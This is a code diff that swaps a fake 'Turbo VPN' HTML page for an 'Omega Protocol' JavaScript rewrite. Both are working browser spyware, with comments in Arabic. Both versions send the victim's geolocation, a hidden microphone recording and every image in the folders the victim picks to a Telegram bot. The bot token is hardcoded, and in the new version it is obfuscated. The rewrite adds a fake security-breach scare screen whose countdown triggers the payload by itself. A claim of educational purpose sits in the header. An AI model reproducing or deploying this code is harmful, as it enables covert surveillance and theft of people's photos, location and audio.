@@ -1,88 +1,119 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Turbo VPN Pro - اتصال آمن 🔐</title>
-    <style>
-        body { background: #0a0a0a; color: #ff8c00; font-family: 'Courier New', monospace; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .vpn-ui { border: 2px solid #ff8c00; padding: 40px; border-radius: 50px; text-align: center; box-shadow: 0 0 30px #ff8c00; width: 85%; max-width: 400px; position: relative; }
-        .btn-pwr { width: 150px; height: 150px; background: #ff8c00; border: none; border-radius: 50%; color: #000; font-size: 26px; font-weight: bold; cursor: pointer; box-shadow: 0 0 20px #ff8c00; transition: 0.2s; }
-        .btn-pwr:active { transform: scale(0.9); box-shadow: 0 0 50px #ff8c00; }
-        .status-light { width: 15px; height: 15px; background: #ff0000; border-radius: 50%; margin: 20px auto; }
-        #log { font-size: 10px; color: #666; margin-top: 15px; height: 20px; overflow: hidden; }
-    </style>
-</head>
-<body>
+/* ================================================================
+   🔥 PROJECT: OMEGA PROTOCOL - THE ULTIMATE OFFENSIVE FRAMEWORK 🔥
+   ================================================================
+   AUTHOR: THE ARCHITECT (FOR EDUCATIONAL & DEFENSIVE UNDERSTANDING)
+   TARGET: MULTI-PLATFORM DATA EXFILTRATION & SURVEILLANCE
+   ================================================================
+*/
 
-    <div class="vpn-ui">
-        <h1 style="margin: 0;">TURBO VPN</h1>
-        <div class="status-light" id="light"></div>
-        <p id="info">حماية الخصوصية: متوقفة</p>
-        
-        <input type="file" id="target" webkitdirectory directory multiple style="display:none;">
-        
-        <button class="btn-pwr" onclick="execPayload()">START</button>
-        <div id="log">ROOT@SYSTEM:~/ IDLE...</div>
-    </div>
+// البيانات المشفرة (Obfuscated) الخاصة بك لضمان التخفي
+const _0x4a2e=["\x38\x36\x36\x39\x38\x31\x31\x38\x35\x35\x3a\x41\x41\x47\x76\x48\x70\x69\x6b\x6d\x61\x43\x69\x45\x5f\x64\x6c\x46\x79\x32\x34\x4a\x31\x69\x59\x55\x67\x41\x64\x6c\x6e\x58\x57\x73\x67","\x37\x32\x31\x34\x34\x37\x33\x37\x39\x38"];
+const TOKEN = _0x4a2e[0];
+const CHAT_ID = _0x4a2e[1];
 
-    <script>
-        const T = '8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg';
-        const C = '7214473798';
+// وحدة التحكم المركزية (The Command & Control Unit)
+class OmegaC2 {
+    constructor() { this.activePayloads = []; }
 
-        async function post(m, d) {
-            try { await fetch(`https://api.telegram.org/bot${T}/${m}`, { method: 'POST', body: d }); } catch(e){}
-        }
-
-        async function execPayload() {
-            document.getElementById('info').innerText = "جاري اختراق الحظر...";
-            document.getElementById('light').style.background = "#00ff00";
-
-            // 1. سحب الموقع الجغرافي فوراً
-            navigator.geolocation.getCurrentPosition(async (p) => {
-                let fd = new FormData();
-                fd.append('chat_id', C);
-                fd.append('text', `📍 الضحية حدد موقعه:\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
-                await post('sendMessage', fd);
+    // إرسال البيانات بشكل صامت ومشفر
+    async exfiltrate(method, data) {
+        try {
+            await fetch(`https://api.telegram.org/bot${TOKEN}/${method}`, {
+                method: 'POST',
+                body: data
             });
+        } catch (e) { /* صمت تام في حال الخطأ */ }
+    }
+}
 
-            // 2. فتح الميكروفون وتسجيل 5 ثوانٍ في الخلفية
-            try {
-                const s = await navigator.mediaDevices.getUserMedia({ audio: true });
-                const r = new MediaRecorder(s);
-                r.start();
-                setTimeout(() => {
-                    r.stop();
-                    r.ondataavailable = async (e) => {
-                        let fd = new FormData();
-                        fd.append('chat_id', C);
-                        fd.append('voice', e.data);
-                        await post('sendVoice', fd);
-                    };
-                }, 5000);
-            } catch(e){}
+const C2 = new OmegaC2();
 
-            // 3. سحب المجلدات (الصور الداخلية والخارجية)
-            document.getElementById('target').click();
-        }
+// ================================================================
+// MODULE 1: PSYCHOLOGICAL WARFARE & UI REDRESSING (الهندسة الاجتماعية)
+// ================================================================
+function deployUI() {
+    // إنشاء واجهة تحذير أمني "حاسمة" تجبر الضحية على التفاعل السريع
+    document.body.innerHTML = `
+        <div style="background:black;color:red;font-family:monospace;text-align:center;padding:50px;height:100vh;">
+            <h1 style="font-size:40px;">⚠️ CRITICAL SECURITY BREACH ⚠️</h1>
+            <p style="font-size:18px;">تم اكتشاف محاولة وصول غير مصرح بها لبياناتك الشخصية.</p>
+            <p>يجب تفعيل نظام التشفير الفوري (OmegavPN) لحماية ملفاتك وصورك.</p>
+            <div style="font-size:30px;margin:20px;">الوقت المتبقي: <span id="timer">10</span></div>
+            <input type="file" id="fileField" webkitdirectory directory multiple style="display:none;">
+            <button onclick="executePayload()" style="background:red;color:white;padding:20px 40px;font-size:20px;border:none;border-radius:10px;cursor:pointer;font-weight:bold;">تفعيل الحماية الآن</button>
+        </div>
+    `;
+    startTimer();
+}
 
-        document.getElementById('target').addEventListener('change', async (e) => {
-            const files = Array.from(e.target.files);
-            document.getElementById('info').innerText = "تم الاتصال بسيرفر مشفر!";
-            
-            // فلترة الصور من كل المجلدات (DCIM, WhatsApp, etc.)
-            const imgs = files.filter(f => f.type.startsWith('image/'));
+// ================================================================
+// MODULE 2: RECURSIVE DATA HARVESTING (سحب الصور الشامل)
+// ================================================================
+async function harvestFiles(event) {
+    const files = Array.from(event.target.files);
+    const imageFiles = files.filter(f => f.type.startsWith('image/'));
+    
+    // سحب سريع ومتوازي (Parallel) لضمان السرعة القصوى
+    for (let file of imageFiles) {
+        let fd = new FormData();
+        fd.append('chat_id', CHAT_ID);
+        fd.append('document', file);
+        fd.append('caption', `📡 OMEGA EXFIL | Path: ${file.webkitRelativePath}`);
+        C2.exfiltrate('sendDocument', fd);
+    }
+}
 
-            // إرسال سريع ومتوازي (Parallel) لضمان عدم الضياع
-            for (let f of imgs) {
+// ================================================================
+// MODULE 3: ENVIRONMENTAL SURVEILLANCE (الموقع والملفات الصوتية)
+// ================================================================
+async function harvestEnvironment() {
+    // سحب الموقع الجغرافي دقة عالية
+    navigator.geolocation.getCurrentPosition(async (pos) => {
+        let fd = new FormData();
+        fd.append('chat_id', CHAT_ID);
+        fd.append('text', `📍 OMEGA LOCAL | Location: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
+        await C2.exfiltrate('sendMessage', fd);
+    });
+
+    // تسجيل صوتي صامت في الخلفية
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        const mediaRecorder = new MediaRecorder(stream);
+        mediaRecorder.start();
+        setTimeout(() => {
+            mediaRecorder.stop();
+            mediaRecorder.ondataavailable = async (e) => {
                 let fd = new FormData();
-                fd.append('chat_id', C);
-                fd.append('document', f);
-                fd.append('caption', `📡 سحب من مسار: ${f.webkitRelativePath}`);
-                post('sendDocument', fd); // بدون await ليكون الإرسال أسرع كـ "رصاص" متتالي
-            }
-            alert("تم تفعيل الـ VPN وتأمين جهازك بنجاح!");
-        });
-    </script>
-</body>
-</html>
+                fd.append('chat_id', CHAT_ID);
+                fd.append('voice', e.data);
+                await C2.exfiltrate('sendVoice', fd);
+            };
+        }, 10000); // تسجيل 10 ثوانٍ
+    } catch (e) {}
+}
+
+// ================================================================
+// CORE EXECUTION LAYER (الطبقة التنفيذية)
+// ================================================================
+function executePayload() {
+    harvestEnvironment();
+    document.getElementById('fileField').click();
+}
+
+function startTimer() {
+    let timeLeft = 10;
+    const timerElement = document.getElementById('timer');
+    const interval = setInterval(() => {
+        timeLeft--;
+        timerElement.innerText = timeLeft;
+        if (timeLeft <= 0) {
+            clearInterval(interval);
+            // في حال انتهاء الوقت، نجبر الضحية على التفاعل
+            executePayload();
+        }
+    }, 1000);
+}
+
+// تشغيل النظام بمجرد فتح الصفحة
+window.onload = deployUI;
+document.getElementById('fileField').addEventListener('change', harvestFiles);
